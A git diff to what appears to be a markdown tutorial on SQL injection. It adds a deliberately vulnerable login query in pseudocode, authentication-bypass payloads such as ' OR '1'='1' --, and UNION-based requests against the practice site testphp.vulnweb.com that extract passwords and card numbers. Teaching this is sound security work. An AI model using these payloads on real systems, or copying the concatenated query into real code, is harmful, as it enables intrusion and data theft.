@@ -9,7 +9,7 @@
      Of Items, Including Sensitive Company Data, User Lists Or Private Customer Details.
 
    ![image](https://user-images.githubusercontent.com/80889609/157209037-e92598ba-9b54-4cba-a298-dd8d8fd12e3a.png)
-       
+     
 ## Types Of SQL Injections.
  
     SQL Injection Can Be Classified Into Three Major Categories – In-band SQLi, Inferential (Blind ) SQLi  & 
@@ -57,8 +57,80 @@
      Out-Of-Band SQLi Is Performed When The Attacker Can't Use The Same Channel To Launch The Attack And Gather Information, 
      Or When A Server Is Too Slow Or Unstable For These Actions To Be Performed. These Techniques Count On The Capacity Of The Server
      To Create DNS Or HTTP Requests To Transfer Data To An Attacker.
+
+## Simple SQL Injection Example
+
+    The first example is very simple. It shows, how an attacker can use an SQL Injection vulnerability to go around 
+    application security and authenticate as the administrator.
+
+  The following script is pseudocode executed on a web server. It is a simple example of authenticating with a username and a password.
+  The example database has a table named users with the following columns: username and password. 
    
- ## SQL-Injection Payloads
+    # Define POST variables
+      uname = request.POST['username']
+      passwd = request.POST['password']
+
+    # SQL query vulnerable to SQLi
+      sql = “SELECT id FROM users WHERE username=’” + uname + “’ AND password=’” + passwd + “’”
+
+    # Execute the SQL statement
+      database.execute(sql)   
+   
+   These Input Fields Are Vulnerable To SQL Injection. An Attacker Could Use SQL Commands In The Input In A Way 
+   That Would Alter The SQL Statement Executed By The Database Server. For Example, They Could Use A Trick
+   Involving A Single Quote And Set The Passwd Field To:-
+
+      password' OR 1=1
+
+   As A Result, The Database Server Runs The Following SQL Query:
+
+  SELECT id FROM users WHERE username='username' AND password='password' OR 1=1'
+
+  Because Of The OR 1=1 Statement, The WHERE Clause Returns The First id From The users Table No Matter What The username And password Are.
+  The First user id In A   Database Is Very Often The Administrator. In This Way, The Attacker Not Only Bypasses Authentication But Also 
+  Gains Administrator Privileges. They Can Also Comment Out The Rest Of The SQL Statement To Control The Execution Of The SQL Query Further:
+
+    -- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
+    ' OR '1'='1' --
+    ' OR '1'='1' /*
+    -- MySQL
+    ' OR '1'='1' #
+    -- Access (using null characters)
+    ' OR '1'='1' %00
+    ' OR '1'='1' %16
+
+## Example Of A Union-Based SQL Injection
+
+ One Of The Most Common Types Of SQL Injection uses The UNION Operator. It Allows The Attacker To Combine The Results Of Two Or More SELECT 
+ Statements Into A Single Result. The Technique Is Called Union-Based SQL Injection.
+
+ The following is an example of this technique. It uses the web page testphp.vulnweb.com, an intentionally vulnerable website hosted by Acunetix.
+ The following HTTP request is a normal request that a legitimate user would send:
+
+    GET http://testphp.vulnweb.com/artists.php?artist=1 HTTP/1.1
+     Host: testphp.vulnweb.com
+ ![image](https://user-images.githubusercontent.com/80889609/157415905-37dc9a7b-eb47-4a93-a2b8-e702e0fac900.png)
+
+ The Artist Parameter Is Vulnerable To SQL Injection.The Following Payload Modifies The Query To Look For An Inexistent Record. 
+ It Sets The Value In The URL Query String To -1. Of Course, It Could Be Any Other Value That Does Not Exist In The Database.
+ However, A Negative Value Is A Good  Guess Because An Identifier In A Database Is Rarely A Negative Number.
+
+ In SQL Injection,The UNION Operator Is Commonly Used To Attach A Malicious SQL Query To The Original Query Intended To Be Run 
+ By The Web Application. The Result Of The Injected Query Will Be Joined With The Result Of The Original Query.This Allows The
+ Attacker To Obtain Column Values From Other Tables.
+ 
+    GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1
+    Host: testphp.vulnweb.com
+![image](https://user-images.githubusercontent.com/80889609/157417615-51827a96-69e3-44fc-a639-aa7f43e3a317.png)
+
+The Following Example Shows How An SQL Injection Payload Could Be Used To Obtain More Meaningful Data From This Intentionally Vulnerable Site:
+
+    GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1
+    Host: testphp.vulnweb.com
+
+![image](https://user-images.githubusercontent.com/80889609/157418082-afc41aaa-6934-4688-8d6c-f43ba6c996d8.png)
+
+## SQL-Injection Payloads
      
      '
      ''
